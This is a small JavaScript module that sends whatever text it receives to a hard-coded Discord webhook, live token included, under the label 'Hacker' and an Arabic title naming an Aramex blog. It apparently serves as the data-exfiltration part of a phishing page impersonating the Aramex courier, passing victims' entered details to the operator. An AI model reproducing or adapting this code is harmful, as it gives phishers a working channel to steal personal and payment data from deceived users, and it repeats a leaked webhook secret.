import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1323841816805773332/gixfcPqaVBUj7YVmIcXl0_ChgBPGdSkie9pPoK2sBpcHW_jtMg_G1J_wfG1qPqWpypJP",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
